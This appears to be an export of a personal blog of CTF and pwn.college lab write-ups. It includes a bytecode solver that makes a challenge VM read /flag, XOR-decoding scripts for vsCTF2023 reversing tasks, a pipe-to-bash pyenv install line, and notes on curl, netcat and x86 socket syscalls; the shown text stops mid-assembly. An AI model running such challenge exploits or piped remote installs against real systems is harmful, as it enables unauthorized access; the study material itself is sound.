# tmp_a.append(4) # opcode[[1]] ++
# tmp_a.append(8)
# tmp_a.append(1)
# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);

# for k in table: # test_register = 1
#     a = tmp_a.copy()
#     # print(a)
#     if (k == 8 or k == 4 or k == 64):
#         continue
#     for i in table: # all register = 0
#         if (i == 8 or i == 4 or i == 64):
#             continue
#         a.append(0)
#         a.append(i)
#         a.append(4)
#     print(k)
#     a.append(2)
#     a.append(k)
#     a.append(4) # one register = 1    
#     a.append(1)
#     a.append(8)
#     a.append(4) # opcode[1024] = 1 # fd = io
#     a.append(1)
#     a.append(4)
#     a.append(1) # write
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
#     time.sleep(0.1)
#     print(p.recv())
#     p.kill()



##  opcode[1025]
# 32
# table = [1,2,4,8,16,32,64,0x80]
# tmp_a = []
# tmp_a.append(ord(&#39;^&#39;))
# tmp_a.append(8)
# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
# tmp_a.append(8)
# tmp_a.append(1)
# tmp_a.append(64) # stm opcode[768] = ord(&#39;^&#39;);
# tmp_a.append(1)
# tmp_a.append(1)
# tmp_a.append(4) # opcode[[1]] ++
# tmp_a.append(ord(&#39;@&#39;))
# tmp_a.append(8)
# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
# tmp_a.append(8)
# tmp_a.append(1)
# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
# tmp_a.append(2)
# tmp_a.append(1)
# tmp_a.append(4) # opcode[[1]] ++
# tmp_a.append(ord(&#39;#&#39;))
# tmp_a.append(8)
# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
# tmp_a.append(8)
# tmp_a.append(1)
# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);

# for k in table: # test opcode[1025]
#     if (k == 1 or k == 8 or k == 64 or k == 4):
#         continue
#     a = tmp_a.copy()
#     # print(a)
#     for i in table: # all register = 0
#         if (i == 8 or i == 4 or i == 64 or i == 1):
#             continue
#         a.append(0)
#         a.append(i)
#         a.append(4)
#     print(k)
#     a.append(1)
#     a.append(k)
#     a.append(4) # opcode[1025] # offset: 1  

#     a.append(1)
#     a.append(1)
#     a.append(4) # opcode[1026] # len: 1  
#     a.append(1)
#     a.append(8)
#     a.append(4) # opcode[1024] = 1 # fd = io
#     a.append(1)
#     a.append(4)
#     a.append(1) # write
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
#     time.sleep(0.1)
#     print(p.recv())
#     p.kill()


# # read
# 32
# table = [1,2,4,8,16,32,64,0x80]
# for k in [2,32]: # test read
#     a = []
#     print(k)
#     a.append(1)
#     a.append(32)
#     a.append(4) # opcode[1025] # offset: 1  

#     a.append(1)
#     a.append(1)
#     a.append(4) # opcode[1026] # len: 1 

#     a.append(0)
#     a.append(8)
#     a.append(4) # opcode[1024] = 0 # fd = io

#     a.append(2)
#     a.append(k)
#     a.append(1) # read

#     a.append(1)
#     a.append(8)
#     a.append(4) # opcode[1024] = 1 # fd = io

#     a.append(1)
#     a.append(4)
#     a.append(1) # write
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
#     time.sleep(0.1)
#     # print(p.recv())
#     p.interactive()
#     p.kill()



# ----------------------------------------------------------------------------------------------------------------------------------- #
#                                                               open -&gt; 
# ----------------------------------------------------------------------------------------------------------------------------------- #
def register(name):
    if (name == &#39;opcode[1024]&#39;):
        return 8
    if (name == &#39;opcode[1025]&#39;):
        return 32
    if (name == &#39;opcode[1026]&#39;):
        return 1
    if (name == &#39;opcode[1027]&#39;):
        return 0
    if (name == &#39;opcode[1028]&#39;):
        return 0
    if (name == &#39;opcode[1029]&#39;):
        return 64
    print(&#39;err register&#39;)

def interpret_instruction(name):
    if (name == &#39;interpret_imm&#39;):
        return 4 &lt;&lt; 16
    if (name == &#39;interpret_add&#39;):
        return 2 &lt;&lt; 16
    if (name == &#39;interpret_stk&#39;):
        return 0
    if (name == &#39;interpret_stm&#39;):
        return 64 &lt;&lt; 16
    if (name == &#39;interpret_ldm&#39;):
        return 32 &lt;&lt; 16
    if (name == &#39;interpret_cmp&#39;):
        return 0
    if (name == &#39;interpret_jmp&#39;):
        return 0
    if (name == &#39;interpret_sys&#39;):
        return 1 &lt;&lt; 16
    print(&#39;err instruction&#39;)

def interpret_imm(regs,value):
    return interpret_instruction(&#39;interpret_imm&#39;) + (register(regs) &lt;&lt; 8) + (value)

def interpret_stm():
    # opcode[1025] = offset
    # opcode[1026] = value
    return interpret_instruction(&#39;interpret_stm&#39;) + (register(&#39;opcode[1025]&#39;) &lt;&lt; 8) + (register(&#39;opcode[1026]&#39;))

def interpret_sys(name):
    if (name == &#39;open&#39;):
        return 8 &lt;&lt; 8
    if (name == &#39;read_code&#39;):
        return 2 &lt;&lt; 8
    if (name == &#39;read&#39;):
        return 32 &lt;&lt; 8
    if (name == &#39;write&#39;):
        return 4 &lt;&lt; 8
    if (name == &#39;sleep&#39;):
        return 128 &lt;&lt; 8
    if (name == &#39;exit&#39;):
        return 16 &lt;&lt; 8
    print(&#39;err sys&#39;)

def open():
    # opcode[opcode[1024] + 768] = addr
    # opcode[1024] = fd
    # opcode[1026] = len
    return interpret_sys(&#39;open&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1024]&#39;) )

def read():
    # opcode[1024] = fd
    # opcode[1025] = ret len
    return interpret_sys(&#39;read&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) )

def write():
    # opcode[1024] = fd
    return interpret_sys(&#39;write&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) )

def exitPro():
    return interpret_sys(&#39;exit&#39;) + interpret_instruction(&#39;interpret_sys&#39;)

opcode_func = &#39;&#39;&#39;
interpret_imm(&#39;opcode[1025]&#39;,0) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;/&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,1) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;f&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,2) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;l&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,3) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;a&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,4) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;g&#39;)) # value
interpret_stm()

interpret_imm(&#39;opcode[1024]&#39;,0) # addr = opcode[0 + 768]
interpret_imm(&#39;opcode[1025]&#39;,0)
interpret_imm(&#39;opcode[1026]&#39;,0)
open()

interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
read()

interpret_imm(&#39;opcode[1024]&#39;,1)
interpret_imm(&#39;opcode[1025]&#39;,0)
interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
write()
exitPro()
&#39;&#39;&#39;
opcode = []
opcode_func = opcode_func.split(&#39;\n&#39;)
# print(opcode_func)
for i in opcode_func:
    if (i == &#39;&#39;):
        continue
    p48 = eval(i)
    opcode.append(p48 &amp; 0xff)
    opcode.append((p48 &amp; 0xff00) &gt;&gt; 8)
    opcode.append((p48 &amp; 0xff0000) &gt;&gt; 16)
opcode+=([0] * (0x300 - len(opcode)))

a = opcode
# print(a)
a = b&#39;&#39;.join([bytes([i]) for i in a])

p = process(&#39;/challenge/babyrev_level22.0&#39;)
p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
p.interactive()
p.kill()
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>ubuntu python version manage</title>
    <url>/2024/01/31/ubuntu-python-version-manage/</url>
    <content><![CDATA[<span id="more"></span>

<pre><code class="shell">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev \
libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev \
libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl
</code></pre>
<pre><code class="shell">$ curl https://pyenv.run | bash
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>vnctf2023</title>
    <url>/2023/02/27/vnctf2023/</url>
    <content><![CDATA[<h3 id="vnctf2023-re"><a href="#vnctf2023-re" class="headerlink" title="vnctf2023 re"></a>vnctf2023 re</h3><ul>
<li><a href="#1.1">BabyAnti</a><span id="more"></span></li>
</ul>
<h4 id="BabyAnti"><a href="#BabyAnti" class="headerlink" title="BabyAnti"></a><div id="1.1">BabyAnti<div></div></div></h4><h5 id="An-android-reverse-problem-The-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-CE-to-pass-the-game"><a href="#An-android-reverse-problem-The-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-CE-to-pass-the-game" class="headerlink" title="An android reverse problem. The official solution is to patch and bypass the anticheat module and use CE to pass the game."></a>An android reverse problem. The official solution is to patch and bypass the anticheat module and use CE to pass the game.</h5><h5 id="Unpacked-the-apk-and-check-it-in-the-ida-When-the-dynamic-library-been-loaded-it-shall-call-the-function-JNI-OnLoad-We-can-see-four-function-after-it"><a href="#Unpacked-the-apk-and-check-it-in-the-ida-When-the-dynamic-library-been-loaded-it-shall-call-the-function-JNI-OnLoad-We-can-see-four-function-after-it" class="headerlink" title="Unpacked the apk and check it in the ida. When the dynamic library been loaded, it shall call the function JNI_OnLoad. We can see four function after it."></a>Unpacked the apk and check it in the ida. When the dynamic library been loaded, it shall call the function JNI_OnLoad. We can see four function after it.</h5><p><code>ret of four func, to be continue</code></p>
<h5 id="A-antiCheat-class-in-Smali-pack"><a href="#A-antiCheat-class-in-Smali-pack" class="headerlink" title="A antiCheat class in Smali pack"></a>A antiCheat class in Smali pack</h5><p><code>to be continue</code></p>
]]></content>
  </entry>
  <entry>
    <title>vsCTF2023</title>
    <url>/2023/09/25/vsCTF/</url>
    <content><![CDATA[<h6 id="PREFACE-快结束了才知道，反正么挺快做了三个题，虽然讲实话很多东西真没看懂，但是逆向么出了就行…"><a href="#PREFACE-快结束了才知道，反正么挺快做了三个题，虽然讲实话很多东西真没看懂，但是逆向么出了就行…" class="headerlink" title="PREFACE: 快结束了才知道，反正么挺快做了三个题，虽然讲实话很多东西真没看懂，但是逆向么出了就行…"></a>PREFACE: 快结束了才知道，反正么挺快做了三个题，虽然讲实话很多东西真没看懂，但是逆向么出了就行…</h6><h6 id="后面的三个题解好少…先看别的地方的题去了…"><a href="#后面的三个题解好少…先看别的地方的题去了…" class="headerlink" title="后面的三个题解好少…先看别的地方的题去了…"></a>后面的三个题解好少…先看别的地方的题去了…</h6><h6 id="ps-这题怎么越做越多…"><a href="#ps-这题怎么越做越多…" class="headerlink" title="ps. 这题怎么越做越多…"></a>ps. 这题怎么越做越多…</h6><span id="more"></span>

<h4 id="x0rr3al"><a href="#x0rr3al" class="headerlink" title="x0rr3al"></a>x0rr3al</h4><h6 id="早知道c语言有一个main调用main的操作，似乎是为数不多c-不支持的c操作？但是这里好像第一次见了"><a href="#早知道c语言有一个main调用main的操作，似乎是为数不多c-不支持的c操作？但是这里好像第一次见了" class="headerlink" title="早知道c语言有一个main调用main的操作，似乎是为数不多c++不支持的c操作？但是这里好像第一次见了?"></a>早知道c语言有一个main调用main的操作，似乎是为数不多c++不支持的c操作？但是这里好像第一次见了?</h6><p>存在反调，可以下掉反调看check，或者直接看逻辑</p>
<p><code>sub_5560774764F7</code> ： 一个简单异或<code>0x12</code></p>
<p><code>sub_55607747650A</code>： 递归异或一个初始化好的表</p>
<p>单字节加密flag，全是异或，这里不需要提取，直接爆破即可：</p>
<pre><code class="python">a = &#39;=&gt;8566#&gt;8=).(;9?6.(;9?&#39;
# for i in a:
#     print(chr(ord(i) ^ 0x5A),end=&#39;&#39;)
# print()
b = f&quot;af&amp;`f2`!d!`a#|u2fz#&#39;2qz&amp;~#2j\&quot;``!s~333&quot;
# for i in b:
#     print(chr(ord(i) ^ 0x12),end=&#39;&#39;)

dest = &#39;s3cR3ts3vsctfvsctiamfrnow0kkeyw0wkeyw&#39;

lld = [ 0x7E, 0x7B, 0x6B, 0x7C, 0x6E, 0x73, 0x7F, 0x3B, 0x3C, 0x63,
  0x57, 0x3C, 0x66, 0x7C, 0x39, 0x57, 0x6C, 0x3B, 0x6A, 0x7D,
  0x6F, 0x6F, 0x3B, 0x7A, 0x7B, 0x57,  0x3C, 0x7A, 0x3B, 0x57, 0x66, 0x38, 0x57, 0x65, 0x3C, 0x7C,
  0x6B, 0x60, 0x57, 0x6E, 0x38, 0x7A, 0x57, 0x7C, 0x60, 0x3B,
  0x57, 0x3B, 0x39, 0x3B, 0x3B, 0x3F, 0x75]

print(len(lld))

# for i in range(len(lld)):
#     print(chr(lld[i] ^ 0x12 ^ ord(dest[11]) ^ ord(dest[0]) ^ ord(dest[22]) ^ ord(dest[33]) ^ ord(dest[44])),end=&#39;&#39;)

for i in range(0xff + 1):
    for j in lld:
        print(chr(i ^ j),end=&#39;&#39;)
    print()

# vsctf&#123;w34k_4nt1_d3bugg3rs_4r3_n0_m4tch_f0r_th3_31337&#125;
</code></pre>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="challange"><a href="#challange" class="headerlink" title="challange"></a>challange</h4><p>用比较复杂的stl（主要是<code>vector</code> 和<code>string</code>）进行数据操作，做了个类似RSA的<code>乘方+取模</code>然后加点异或生成了一个vector用于加密，但是加密逻辑只有异或，flag是50位的</p>
<p><img src="/2023/09/25/vsCTF/image-20230925110429523.png" alt="image-20230925110429523"></p>
<p>这里不需要硬逆逻辑，下掉<code>ptrace</code>反调（这里原本有exit(0);已经nop掉了）</p>
<p><img src="/2023/09/25/vsCTF/image-20230925110532965.png" alt="image-20230925110532965"></p>
<p>在check的地方把检查逻辑改掉（改成如果不相等则退出）</p>
<p><img src="/2023/09/25/vsCTF/image-20230925110635140.png" alt="image-20230925110635140"></p>
<p>提取异或的key数据</p>
<pre><code class="python">print(hex(get_reg_value(&quot;ebx&quot;)) , end = &#39;, &#39;)
</code></pre>
<p>直接梭就行（这里输入的是全1的flag，flag也刚好没有1，可以多用几个试几次）：</p>
<pre><code class="python">enc = [149, 148, 5, 88, 128, 22, 47, 70, 184, 117, 311, 57, 145, 224, 32, 112, 77, 185, 25, 59, 79, 4, 31, 184, 156, 79, 241, 179, 162, 68, 119, 244, 92, 109, 29, 47, 123, 154, 33, 224, 223, 125, 159, 194, 116, 63, 4, 246, 199, 250, 0]
# for i in range(len(enc)):
#     print(chr(enc[i] ^ i),end=&#39;&#39;)

a = &#39;11111111111111111111111111111111111111111111111111&#39;

b = [0xd2, 0xd6, 0x57, 0x1d, 0xd7, 0x5c, 0x78, 0x22, 0xe7, 0x7, 0x131, 0x39, 0x90, 0x9f, 0x25, 0xd, 0x23, 0xb8, 0x58, 0x55, 0x9, 0x6a, 0x6d, 0xe6, 0xc0, 0xe, 0xa5, 0xf6, 0xfa, 0x1, 0x2f, 0xb3, 0x8, 0x3, 0x7c, 0x6c, 0x25, 0xcc, 0x4f, 0x85, 0xab, 0x1, 0xfe, 0xbf, 0x4, 0x5a, 0x70, 0x94, 0xc9, 0xb6]

# print(0xd2 ^ ord(&#39;1&#39;))
# print(227 ^ 149)
# print(chr(227 ^ 149))
for i in range(len(b)):
    print(chr(enc[i] ^ b[i] ^ ord(&#39;1&#39;)),end=&#39;&#39;)

# vsctf&#123;fUnC710N4L_0p_w_Competitive_Prog_TEMPLATES?&#125;
</code></pre>
<h4 id="teenage-wasm"><a href="#teenage-wasm" class="headerlink" title="teenage-wasm"></a>teenage-wasm</h4><h6 id="说实话第一次做wasm…"><a href="#说实话第一次做wasm…" class="headerlink" title="说实话第一次做wasm…"></a>说实话第一次做wasm…</h6><p>插件： <a href="https://github.com/nneonneo/ghidra-wasm-plugin/releases/tag/v2.1.0">Release Version 2.1.0 · nneonneo&#x2F;ghidra-wasm-plugin (github.com)</a></p>
<p>选择的是<code>Ghidra + wasm</code>插件的反编译方案，还是比较清晰的</p>
<p><img src="/2023/09/25/vsCTF/image-20230925111041089.png" alt="image-20230925111041089"></p>
<p>可以拿到一个js代码，和一个wasm代码，这里找不到button的处理handle，纠结了很久，然后友web手说可能是wasm里面注册了监听，orz真该学学web了…</p>
<p>js代码中大概是 <code>wasm-bindgen</code>编译的与wasm交互的产物，只负责中间件，将字符串共享给wasm，并接收共享字符串</p>
<p>可以直接来看wasm，代码很多，rust编译的也相对抽象，经过前面说的可能是监听的button可以翻翻代码，然后发现了这个</p>
<p><img src="/2023/09/25/vsCTF/image-20230925111803725.png" alt="image-20230925111803725"></p>
<p><code>flush_messages</code></p>
<p><img src="/2023/09/25/vsCTF/image-20230925111851725.png" alt="image-20230925111851725"></p>
<p>加密逻辑也很显眼…</p>
<p>虽然其实还并不是狠看懂这个怎么传回去的，但是提取数据异或一下真的就是flag了…（他真的很喜欢异或）</p>
<pre><code class="python">a_list = [&quot;7a&quot;,
&quot;5158577471345867&quot;,
&quot;4a77746f79675a70&quot;,
&quot;6a4d5a776d716272&quot;,
&quot;46625f373333316d&quot;,
&quot;73617765766f6c69&quot;,
]

b_list = [&quot;07&quot;,
&quot;1f16203f4345352d&quot;,
&quot;123a201a2e170515&quot;,
&quot;072229441a103d06&quot;,
&quot;760c00445a6c5c1e&quot;,
&quot;47160c03020c1f1f&quot;,
]

flag = &#39;&#39;

for i in range(6):
    a = [int(a_list[i][j: j + 2], 16) for j in range(0, len(a_list[i]), 2)]
    b = [int(b_list[i][j: j + 2], 16) for j in range(0, len(b_list[i]), 2)]
    for j in range(len(a)):
        flag += chr(a[j] ^ b[j])

print(flag[::-1])

# vsctf&#123;w4sm_is_n0t_aw3some_pWuTMXJmq2KwNN&#125;
</code></pre>
<h6 id="9-26-感觉本来wasm就见得不多，会做的更是少，还是不要草草结束了这个题，把他给逆完整一点"><a href="#9-26-感觉本来wasm就见得不多，会做的更是少，还是不要草草结束了这个题，把他给逆完整一点" class="headerlink" title="9-26: 感觉本来wasm就见得不多，会做的更是少，还是不要草草结束了这个题，把他给逆完整一点"></a>9-26: 感觉本来wasm就见得不多，会做的更是少，还是不要草草结束了这个题，把他给逆完整一点</h6><p>直觉上<code>flesh_message</code>既然找不到<code>x-ref</code>，应该还是有更多处理逻辑的，首先是这里的比对</p>
<p><img src="/2023/09/25/vsCTF/image-20230926204837431.png" alt="image-20230926204837431"></p>
<p>local_18拿到了param2（即用户的一个输入），与<code>admin</code>字符串进行了比对，如果不是admin会返回Login fail的提示</p>
<p><img src="/2023/09/25/vsCTF/image-20230926205045674.png" alt="image-20230926205045674"></p>
<p><img src="/2023/09/25/vsCTF/image-20230926205146253.png" alt="image-20230926205146253"></p>
<h6 id="（可以右键更换数据类型）"><a href="#（可以右键更换数据类型）" class="headerlink" title="（可以右键更换数据类型）"></a>（可以右键更换数据类型）</h6><p>这个地方感觉有机会，看看下面，找到了类似的结构：</p>
<p><img src="/2023/09/25/vsCTF/image-20230926205948905.png" alt="image-20230926205948905"></p>
<p>但是这里没那么明显，先试试我怎么出的：</p>
<p>这里除去<code>admin</code>已经没有明显的全局变量了，能包含有字符信息的内容不多，然后突然意识到这里全都是可见字符：<img src="/2023/09/25/vsCTF/image-20230926210857339.png" alt="image-20230926210857339"></p>
<p>那其实很蹊跷了，打印一下看看</p>
<p><img src="/2023/09/25/vsCTF/image-20230926210952849.png" alt="image-20230926210952849"></p>
<p>感觉就很明显了，有明显的英文语法痕迹（？）</p>
<p>逆转过来：</p>
<p><img src="/2023/09/25/vsCTF/image-20230926211040498.png" alt="image-20230926211040498"></p>
<p>这个就是密码…</p>
<p><img src="/2023/09/25/vsCTF/image-20230926211059432.png" alt="image-20230926211059432"></p>
<p>回来看看逻辑，到底放在哪里</p>
<p>前面没注意，但是这里有个很明显的把参数提取成utf-8的操作：</p>
<p><img src="/2023/09/25/vsCTF/image-20230926211238954.png" alt="image-20230926211238954"></p>
<p>然后存储<code>local_18</code> -&gt; <code>local_68</code>在下面进行比较</p>
<p>还是对这些符号不够敏感…</p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>web入门操作</title>
    <url>/2024/04/14/web%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h6 id="PREFACE："><a href="#PREFACE：" class="headerlink" title="PREFACE："></a>PREFACE：</h6><span id="more"></span>

<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><ul>
<li>curl 发送 get指令</li>
</ul>
<blockquote>
<p>curl 127.0.0.1 -p 80</p>
</blockquote>
<p>注意url编码</p>
<p>添加header</p>
<blockquote>
<p>curl 127.0.0.1 -p 80 –header “Host:40bb89ca76728698378750073647169d”</p>
</blockquote>
<p>注意转义</p>
<blockquote>
<p>curl 127.0.0.1?a&#x3D;963fe9d3ff95f80bff64f57c210a739f<br>\&amp;b&#x3D;f8e12324%202bbd1304%2634341212%231eebbb9b</p>
</blockquote>
<p>POST data：</p>
<blockquote>
<p>curl 127.0.0.1 -d a&#x3D;5129ddc180c847f3788d5493e2fdea93</p>
</blockquote>
<p>发送json（json内不需要转义）</p>
<blockquote>
<p>curl 127.0.0.1:80 -H “Content-Type:application&#x2F;json” -d ‘{“a”:”17aa707fc88e62cab3cf40403d43e025”,”b”:{“c”:”6869f0a6”,”d”:[“193c021a”,”1de1e1a0 9384ce04&amp;8ae5cbbb#6<br>eabcff1”]}}’</p>
</blockquote>
<p>重定向</p>
<blockquote>
<p>curl 127.0.0.1 –location-trusted</p>
</blockquote>
<p>获取cookie</p>
<blockquote>
<p>curl -c - 127.0.0.1:80</p>
</blockquote>
<p>发送cookie</p>
<blockquote>
<p>curl –cookie 71ed1a72ed58d7146e2798f2945a11dc 127.0.0.1</p>
</blockquote>
<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><ul>
<li>nc 发送get指令</li>
</ul>
<blockquote>
<p>printf “GET &#x2F;index.html HTTP&#x2F;1.1\r\nUser-Agent: nc&#x2F;0.0.1\r\nHost: 127.0.0.1\r\nAccept: *&#x2F;*\r\n\r\n” | nc 127.0.0.1 80</p>
</blockquote>
<p>注意：更改为其他input方式，否则url编码会过不了</p>
<blockquote>
<p> hacker@talking-web~level14:&#x2F;$ nc 127.0.0.1 80<br>GET &#x2F;index.html?a&#x3D;a1834ce5ff3a8434e97e721b647e84a0 HTTP&#x2F;1.1</p>
</blockquote>
<p>可以：nc 127.0.0.1 80 &lt; exp.txt</p>
<p>tips: 这里nc会自动把\n处理成\r\n</p>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 34

a=b7f875a1d22f3884e72c830ccd2dae79
</code></pre>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/json
Content-Length: 40

&#123;&quot;a&quot;:&quot;fb1fcbc678ea9ab1c60e7d89291a6ad0&quot;&#125;
</code></pre>
<p>nc信任重定向</p>
<p>cookie：</p>
<pre><code>POST /08ef55da8a1e676feea750320e3b0942 HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 116
Cookie: cookie=c106c3a4d0d7620eee3b2cd121ff77ec
Referer: 127.0.0.1

</code></pre>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><ul>
<li>python 发送get（不需要url编码）</li>
</ul>
<pre><code class="python">import requests
headers = &#123;
    &#39;Host&#39;:&quot;71da60ef1b789332773275354004e689&quot;,
&#125;
response = requests.post(&quot;http://127.0.0.1:80&quot;,params=&#123;&quot;a&quot;:&quot;62e9fb4ed3b5fafd87b163b3a20fef5b&quot;,&quot;b&quot;:&quot;93db500a 663544b4&amp;c0fa24b2#5b3824c1&quot;&#125;,headers=headers)
print(response.text)
</code></pre>
<ul>
<li>post</li>
</ul>
<pre><code class="python">import requests
import json
data = &#123;&quot;a&quot;:&quot;fb7a58692e22a3fc71c5017aa0541b00&quot;&#125;
headers = &#123;
    &#39;Host&#39;:&quot;71da60ef1b789332773275354004e689&quot;,
    &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded; charset=utf-8&quot;,
&#125;
response = requests.post(&quot;http://127.0.0.1:80&quot;,data=data,headers=headers)
print(response.text)
</code></pre>
<p>json</p>
<pre><code class="python">import requests
import json
data = &#123;&quot;a&quot;:&quot;cb449746a07887172af1ad3bc700d7cc&quot;,&quot;b&quot;:&quot;6b0e7b4b 208ac3c8&amp;2a6652a6#b948b54f&quot;&#125;
data = json.dumps(data)
headers = &#123;
    &#39;Host&#39;:&quot;71da60ef1b789332773275354004e689&quot;,
    &quot;Content-Type&quot;:&quot;application/json&quot;,
&#125;
response = requests.post(&quot;http://127.0.0.1:80&quot;,data=data,headers=headers)
print(response.text)
</code></pre>
<p>Python自动重定向</p>
<p>Python不需要手动维护cookie</p>
<h3 id="web-syscall"><a href="#web-syscall" class="headerlink" title="web syscall"></a>web syscall</h3><p>network system calls are mostly big endian</p>
<p>ip protocol socket:</p>
<blockquote>
<p>socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</p>
</blockquote>
<pre><code class="asm">    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
</code></pre>
<p>bind:</p>
<blockquote>
<p>bind(3, {sa_family&#x3D;AF_INET, sin_port&#x3D;htons(80), sin_addr&#x3D;inet_addr(“0.0.0.0”)}, 16)</p>
</blockquote>
<pre><code class="asm">    sub rsp, 4
    mov word ptr [rsp], 2
    mov word ptr [rsp + 3], 80
    mov dword ptr [rsp + 4], 0x00000000
    push rsp
    pop rsi
    mov rdi, rax
    mov rdx, 16
    mov rax, 49
    syscall
</code></pre>
<p>accept </p>
<blockquote>
<p>accept(3, NULL, NULL)</p>
</blockquote>
<pre><code class="asm">    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
</code></pre>
<p>进行接收&amp;回包</p>
<blockquote>
<p>[✓] execve(“&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3”, [“&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3”], 0x7f0eeb6ad980 &#x2F;* 0 vars *&#x2F;) &#x3D; 0<br>[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) &#x3D; 3<br>[✓] bind(3, {sa_family&#x3D;AF_INET, sin_port&#x3D;htons(80), sin_addr&#x3D;inet_addr(“0.0.0.0”)}, 16) &#x3D; 0<br>[✓] listen(3, 0)                            &#x3D; 0<br>[✓] accept(3, NULL, NULL)                   &#x3D; 4<br>[✓] read(4, “GET &#x2F; HTTP&#x2F;1.1\r\nHost: localhost\r\nUser-Agent: python-requests&#x2F;2.31.0\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: *&#x2F;*\r\nConnection: keep-alive\r\n\r\n”, 10000) &#x3D; 146<br>[✓] write(4, “HTTP&#x2F;1.0 200 OK\r\n\r\n”, 19) &#x3D; 19<br>[✓] close(4)                                &#x3D; 0<br>[✓] exit(0)                                 &#x3D; ?</p>
</blockquote>
<pre><code class="asm">.intel_syntax noprefix
.globl _start
.section .text
_start:
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    sub rsp, 4
    mov word ptr [rsp], 2
    mov word ptr [rsp + 3], 80
    mov dword ptr [rsp + 4], 0x00000000
    push rsp
    pop rsi
    mov rdi, rax
    mov rdx, 16
    mov rax, 49
    syscall
    mov rdi, 3
    mov rsi, 0
    mov rax, 50
    syscall

    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
    mov rdi, 4
    push rsp
    pop rsi
    mov rdx, 10000
    xor rax, rax
    syscall
    sub rsp, 19
    mov dword ptr [rsp], 0x50545448
    mov dword ptr [rsp + 4], 0x302e312f
    mov dword ptr [rsp + 8], 0x30303220
    mov dword ptr [rsp + 12], 0x0d4b4f20
    mov qword ptr [rsp + 16], 0xa0d0a
    push rsp
    pop rsi
    mov rdx, 19
    mov rax, 1
    syscall
    mov rdi, 4
    mov rax, 3
    syscall
    mov rdi, 0
    mov rax, 60
    syscall
</code></pre>
<p>根据接包进行get请求：</p>
<pre><code class="asm">.intel_syntax noprefix
.globl _start
.section .text
_start:
    mov rdi, 3
    mov rax, 3
    syscall

    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    sub rsp, 4
    mov word ptr [rsp], 2
    mov word ptr [rsp + 3], 80
    mov dword ptr [rsp + 4], 0x00000000
    push rsp
    pop rsi
    mov rdi, rax
    mov rdx, 16
    mov rax, 49
    syscall
    mov rdi, 3
    mov rsi, 0
    mov rax, 50
    syscall

    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall

    //fork
    mov rax, 57
    syscall

    // read
    mov rdi, 4
    push rsp
    pop rsi
    mov rdx, 10000
    xor rax, rax
    syscall
    mov rcx, rsp
    add rcx, 4


    // open
    sub rsp, 9
    mov byte ptr [rsp], 0x2e
